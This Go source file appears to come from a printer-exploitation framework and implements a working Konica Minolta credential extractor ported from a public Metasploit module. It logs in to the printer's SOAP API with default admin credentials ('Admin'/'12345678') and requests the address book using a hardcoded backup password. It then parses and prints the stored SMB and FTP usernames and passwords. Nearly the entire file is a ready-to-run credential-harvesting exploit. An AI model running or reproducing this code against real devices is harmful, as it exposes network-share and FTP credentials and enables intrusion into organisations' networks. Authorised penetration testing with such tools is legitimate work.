package safe

import (
	"bytes"
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewKonicaPwdExtract() }) }

// KonicaPwdExtract implements the Konica Minolta password extractor.
// It uses the OpenAPI SOAP interface on port 50001 to authenticate and
// extract stored SMB and FTP credentials from the address book.
//
// Based on the public Metasploit module auxiliary/gather/konica_minolta_pwd_extract.
//
// Supported models: C224, C280, 283, C353, C360, 363, 420, C452, C454e, C554.
//
// Category: SAFE — read-only extraction, no settings modified.
type KonicaPwdExtract struct {
	modules.BaseModule
}

// NewKonicaPwdExtract creates a new instance of the Konica Minolta password extractor.
func NewKonicaPwdExtract() *KonicaPwdExtract {
	m := &KonicaPwdExtract{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "konica/soap/pwd_extract",
				Description:  "Konica Minolta Password Extractor — extracts SMB/FTP credentials via SOAP API",
				Manufacturer: "Konica Minolta",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss"},
				Tags:         []string{"konica", "minolta", "soap", "credentials", "smb", "ftp", "password", "mfp"},
				Models:       []string{"C224", "C280", "283", "C353", "C360", "363", "420", "C452", "C454e", "C554"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "50001", Required: false, Description: "Target SOAP API port"},
				{Name: "USERNAME", Default: "Admin", Required: false, Description: "Login username"},
				{Name: "PASSWORD", Default: "12345678", Required: false, Description: "Admin password"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "20", Required: false, Description: "HTTP request timeout in seconds"},
			{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

// Check verifies the target is a Konica Minolta device and default credentials work.
func (k *KonicaPwdExtract) Check() (*modules.CheckResult, error) {
	if err := k.Validate(); err != nil {
		return nil, err
	}

	rhost := k.Val("RHOST")
	rport := k.Val("RPORT")
	verbose := k.BoolVal("VERBOSE")
	timeout := k.IntVal("TIMEOUT", 20)
	portInt := k.IntVal("RPORT", 50001)

	if verbose {
		output.Info("Checking %s:%s for Konica Minolta SOAP API...", rhost, rport)
	}

	client := k.newHTTPClient(timeout)

	// Step 1: Get version to confirm it's a Konica Minolta
	major, minor, err := k.getVersion(client, rhost, rport, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false,
			Target:  rhost,
			Port:    portInt,
			Details: fmt.Sprintf("Not a Konica Minolta or SOAP API unavailable: %v", err),
		}, nil
	}

	if verbose {
		output.Success("Konica Minolta detected (OpenAPI %s.%s)", major, minor)
	}

	// Step 2: Try login with configured credentials
	if verbose {
		output.Info("  Attempting login as %s...", k.Val("USERNAME"))
	}

	authKey, err := k.login(client, rhost, rport, major, minor, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success:  false,
			Target:   rhost,
			Port:     portInt,
			Username: k.Val("USERNAME"),
			Password: k.Val("PASSWORD"),
			Details:  fmt.Sprintf("Login failed: %v", err),
		}, nil
	}

	_ = authKey

	return &modules.CheckResult{
		Success:  true,
		Target:   rhost,
		Port:     portInt,
		Username: k.Val("USERNAME"),
		Password: k.Val("PASSWORD"),
		Details:  fmt.Sprintf("Konica Minolta OpenAPI %s.%s — credentials accepted", major, minor),
	}, nil
}

// Exploit authenticates to the SOAP API and extracts stored SMB/FTP credentials.
func (k *KonicaPwdExtract) Exploit() (*modules.ExploitResult, error) {
	if err := k.Validate(); err != nil {
		return nil, err
	}

	rhost := k.Val("RHOST")
	rport := k.Val("RPORT")
	verbose := k.BoolVal("VERBOSE")
	timeout := k.IntVal("TIMEOUT", 20)
	portInt := k.IntVal("RPORT", 50001)

	client := k.newHTTPClient(timeout)

	// Step 1: Get version
	output.Info("Querying SOAP API on %s:%s...", rhost, rport)

	major, minor, err := k.getVersion(client, rhost, rport, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Version query failed: %v", err),
		}, nil
	}

	output.Success("Konica Minolta detected (OpenAPI %s.%s)", major, minor)

	// Step 2: Login
	output.Info("Logging in as %s...", k.Val("USERNAME"))

	authKey, err := k.login(client, rhost, rport, major, minor, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Login failed: %v", err),
		}, nil
	}

	output.Success("Login successful (AuthKey: %s)", authKey)

	// Step 3: Extract credentials
	output.Info("Extracting address book credentials...")

	creds, err := k.extractCredentials(client, rhost, rport, major, minor, authKey, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Credential extraction failed: %v", err),
		}, nil
	}

	if len(creds) == 0 {
		output.Warn("No stored credentials found in address book")
		return &modules.ExploitResult{
			Success: true, Target: rhost, Port: portInt,
			Details: "Authentication succeeded but no stored credentials found",
		}, nil
	}

	// Display results
	fmt.Println()
	for _, c := range creds {
		output.Success("--- %s Credential ---", c.Protocol)
		if c.Host != "" {
			output.Success("  Host: %s", c.Host)
		}
		if c.Port != "" {
			output.Success("  Port: %s", c.Port)
		}
		output.Success("  Username: %s", c.Username)
		output.Success("  Password: %s", c.Password)
		fmt.Println()
	}

	// Build data string for storage
	var dataLines []string
	for _, c := range creds {
		line := fmt.Sprintf("[%s]", c.Protocol)
		if c.Host != "" {
			line += fmt.Sprintf(" Host: %s", c.Host)
		}
		if c.Port != "" {
			line += fmt.Sprintf(" Port: %s", c.Port)
		}
		line += fmt.Sprintf(" User: %s Pass: %s", c.Username, c.Password)
		dataLines = append(dataLines, line)
	}

	return &modules.ExploitResult{
		Success: true,
		Target:  rhost,
		Port:    portInt,
		Details: fmt.Sprintf("Extracted %d credential(s) from address book", len(creds)),
		Data:    strings.Join(dataLines, "\n"),
	}, nil
}

// extractedCred holds a single extracted credential.
type extractedCred struct {
	Protocol string
	Host     string
	Port     string
	Username string
	Password string
}

func (k *KonicaPwdExtract) newHTTPClient(timeoutSec int) *http.Client {
	return &http.Client{
		Timeout:   time.Duration(timeoutSec) * time.Second,
		Transport: modules.NewHTTPTransport(k.Val("PROXY")),
	}
}

// getVersion sends a minimal SOAP envelope and parses the OpenAPI version.
func (k *KonicaPwdExtract) getVersion(client *http.Client, rhost, rport string, verbose bool) (major, minor string, err error) {
	envelope := `<?xml version="1.0" encoding="utf-8"?>` +
		`<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">` +
		`</SOAP-ENV:Envelope>`

	body, err := k.soapRequest(client, rhost, rport, envelope, verbose)
	if err != nil {
		return "", "", fmt.Errorf("version request: %w", err)
	}

	major, err = xmlExtract(body, "Major")
	if err != nil {
		return "", "", fmt.Errorf("parse Major version: %w", err)
	}

	minor, err = xmlExtract(body, "Minor")
	if err != nil {
		return "", "", fmt.Errorf("parse Minor version: %w", err)
	}

	if verbose {
		output.Info("  OpenAPI version: %s.%s", major, minor)
	}

	return major, minor, nil
}

// login authenticates via SOAP and returns the AuthKey token.
func (k *KonicaPwdExtract) login(client *http.Client, rhost, rport, major, minor string, verbose bool) (string, error) {
	username := k.Val("USERNAME")
	password := k.Val("PASSWORD")
	ns := fmt.Sprintf("OpenAPI-%s-%s", major, minor)

	envelope := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>`+
		`<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">`+
		`<SOAP-ENV:Header>`+
		`<AppReqHeader xmlns="http://www.konicaminolta.com/Header/%s">`+
		`</AppReqHeader>`+
		`</SOAP-ENV:Header>`+
		`<SOAP-ENV:Body>`+
		`<AppReqLogin xmlns="http://www.konicaminolta.com/service/%s">`+
		`<OperatorInfo>`+
		`<UserType>%s</UserType>`+
		`<Password>%s</Password>`+
		`</OperatorInfo>`+
		`</AppReqLogin>`+
		`</SOAP-ENV:Body>`+
		`</SOAP-ENV:Envelope>`,
		ns, ns, xmlEscape(username), xmlEscape(password))

	body, err := k.soapRequest(client, rhost, rport, envelope, verbose)
	if err != nil {
		return "", fmt.Errorf("login request: %w", err)
	}

	authKey, err := xmlExtract(body, "AuthKey")
	if err != nil {
		// Check for error response
		if errMsg, e := xmlExtract(body, "Message"); e == nil && errMsg != "" {
			return "", fmt.Errorf("authentication failed: %s", errMsg)
		}
		return "", fmt.Errorf("parse AuthKey: %w (login may have failed)", err)
	}

	if authKey == "" {
		return "", fmt.Errorf("empty AuthKey — authentication likely failed")
	}

	if verbose {
		output.Info("  AuthKey: %s", authKey)
	}

	return authKey, nil
}

// extractCredentials fetches the address book and parses SMB/FTP credentials.
func (k *KonicaPwdExtract) extractCredentials(client *http.Client, rhost, rport, major, minor, authKey string, verbose bool) ([]extractedCred, error) {
	ns := fmt.Sprintf("OpenAPI-%s-%s", major, minor)

	envelope := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>`+
		`<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">`+
		`<SOAP-ENV:Header>`+
		`<AppReqHeader xmlns="http://www.konicaminolta.com/Header/%s">`+
		`<AuthKey>%s</AuthKey>`+
		`</AppReqHeader>`+
		`</SOAP-ENV:Header>`+
		`<SOAP-ENV:Body>`+
		`<AppReqGetAbbr xmlns="http://www.konicaminolta.com/service/%s">`+
		`<AbbrListCondition>`+
		`<SearchKey>None</SearchKey>`+
		`<BackUpPassword>MYSKIMGS</BackUpPassword>`+
		`<OffsetRange>`+
		`<Start>1</Start>`+
		`<Length>100</Length>`+
		`</OffsetRange>`+
		`</AbbrListCondition>`+
		`</AppReqGetAbbr>`+
		`</SOAP-ENV:Body>`+
		`</SOAP-ENV:Envelope>`,
		ns, xmlEscape(authKey), ns)

	body, err := k.soapRequest(client, rhost, rport, envelope, verbose)
	if err != nil {
		return nil, fmt.Errorf("extract request: %w", err)
	}

	if verbose {
		output.Info("  Response size: %d bytes", len(body))
	}

	return k.parseCreds(body, verbose), nil
}

// parseCreds extracts SMB and FTP credentials from the SOAP response body.
func (k *KonicaPwdExtract) parseCreds(body string, verbose bool) []extractedCred {
	var creds []extractedCred

	// Parse SMB credentials from SmbMode blocks
	smbCreds := parseCredBlocks(body, "SmbMode", "SMB", verbose)
	creds = append(creds, smbCreds...)

	// Parse FTP credentials from FtpServerMode blocks
	ftpCreds := parseFTPBlocks(body, verbose)
	creds = append(creds, ftpCreds...)

	return creds
}

// parseCredBlocks extracts credentials from SmbMode XML blocks.
func parseCredBlocks(body, tag, protocol string, verbose bool) []extractedCred {
	var creds []extractedCred

	blocks := xmlExtractAll(body, tag)
	for _, block := range blocks {
		user, _ := xmlExtractFrom(block, "User")
		pass, _ := xmlExtractFrom(block, "Password")
		host, _ := xmlExtractFrom(block, "Host")

		if user == "" && pass == "" {
			continue
		}

		if verbose {
			output.Info("  Found %s credential: %s@%s", protocol, user, host)
		}

		creds = append(creds, extractedCred{
			Protocol: protocol,
			Host:     host,
			Username: user,
			Password: pass,
		})
	}

	return creds
}

// parseFTPBlocks extracts credentials from FtpServerMode XML blocks.
func parseFTPBlocks(body string, verbose bool) []extractedCred {
	var creds []extractedCred

	blocks := xmlExtractAll(body, "FtpServerMode")
	for _, block := range blocks {
		user, _ := xmlExtractFrom(block, "User")
		pass, _ := xmlExtractFrom(block, "Password")
		addr, _ := xmlExtractFrom(block, "Address")
		port, _ := xmlExtractFrom(block, "PortNo")

		if user == "" && pass == "" {
			continue
		}

		if verbose {
			output.Info("  Found FTP credential: %s@%s:%s", user, addr, port)
		}

		creds = append(creds, extractedCred{
			Protocol: "FTP",
			Host:     addr,
			Port:     port,
			Username: user,
			Password: pass,
		})
	}

	return creds
}

// soapRequest sends a SOAP XML envelope to the target and returns the response body.
func (k *KonicaPwdExtract) soapRequest(client *http.Client, rhost, rport, envelope string, verbose bool) (string, error) {
	scheme := "http"
	if k.BoolVal("SSL") {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%s/", scheme, rhost, rport)

	if verbose {
		output.Info("  SOAP request to %s (%d bytes)", url, len(envelope))
	}

	req, err := http.NewRequest("POST", url, bytes.NewBufferString(envelope))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")
	req.Header.Set("SOAPAction", `""`)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}

	if verbose {
		output.Info("  Response status: %d, size: %d bytes", resp.StatusCode, len(respBody))
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("HTTP %d: %s", resp.StatusCode, http.StatusText(resp.StatusCode))
	}

	return string(respBody), nil
}

// xmlExtract finds the first occurrence of <tag>value</tag> in the XML string.
func xmlExtract(body, tag string) (string, error) {
	open := "<" + tag + ">"
	close := "</" + tag + ">"

	start := strings.Index(body, open)
	if start == -1 {
		// Try with namespace prefix (e.g., <ns:Tag>)
		return xmlExtractNS(body, tag)
	}

	start += len(open)
	end := strings.Index(body[start:], close)
	if end == -1 {
		return "", fmt.Errorf("unclosed tag <%s>", tag)
	}

	return strings.TrimSpace(body[start : start+end]), nil
}

// xmlExtractNS handles namespace-prefixed tags like <ns:Tag>.
func xmlExtractNS(body, tag string) (string, error) {
	// Search for ":Tag>" pattern
	marker := ":" + tag + ">"
	idx := strings.Index(body, marker)
	if idx == -1 {
		return "", fmt.Errorf("tag <%s> not found", tag)
	}

	start := idx + len(marker)

	closeSearch := body[start:]

	// Find the next occurrence of :Tag> which should be the closing tag
	closeIdx := strings.Index(closeSearch, "</")
	if closeIdx == -1 {
		return "", fmt.Errorf("no closing tag for <%s>", tag)
	}

	// Extract just the content up to the next closing tag
	content := closeSearch[:closeIdx]
	return strings.TrimSpace(content), nil
}

// xmlExtractFrom extracts a tag value from a specific XML fragment.
func xmlExtractFrom(fragment, tag string) (string, error) {
	return xmlExtract(fragment, tag)
}

// xmlExtractAll returns all occurrences of a given XML block.
func xmlExtractAll(body, tag string) []string {
	var blocks []string
	open := "<" + tag + ">"
	close := "</" + tag + ">"
	remaining := body

	for {
		start := strings.Index(remaining, open)
		if start == -1 {
			// Try namespace-prefixed version
			nsBlocks := xmlExtractAllNS(remaining, tag)
			blocks = append(blocks, nsBlocks...)
			break
		}

		end := strings.Index(remaining[start:], close)
		if end == -1 {
			break
		}

		blockEnd := start + end + len(close)
		blocks = append(blocks, remaining[start:blockEnd])
		remaining = remaining[blockEnd:]
	}

	return blocks
}

// xmlExtractAllNS handles namespace-prefixed block extraction.
func xmlExtractAllNS(body, tag string) []string {
	var blocks []string
	openMarker := ":" + tag + ">"
	closeMarker := ":" + tag + ">"
	remaining := body

	for {
		idx := strings.Index(remaining, openMarker)
		if idx == -1 {
			break
		}

		// Find the start of this opening tag (scan back for '<')
		tagStart := strings.LastIndex(remaining[:idx], "<")
		if tagStart == -1 {
			break
		}

		// Find the closing tag
		searchFrom := idx + len(openMarker)
		closeIdx := strings.Index(remaining[searchFrom:], "</")
		if closeIdx == -1 {
			break
		}

		// Find the matching close marker after </
		closeTagStart := searchFrom + closeIdx
		closeEnd := strings.Index(remaining[closeTagStart:], closeMarker)
		if closeEnd == -1 {
			break
		}

		blockEnd := closeTagStart + closeEnd + len(closeMarker)
		blocks = append(blocks, remaining[tagStart:blockEnd])
		remaining = remaining[blockEnd:]
	}

	return blocks
}

// xmlEscape escapes special characters for XML content.
func xmlEscape(s string) string {
	var buf bytes.Buffer
	if err := xml.EscapeText(&buf, []byte(s)); err != nil {
		return s
	}
	return buf.String()
}
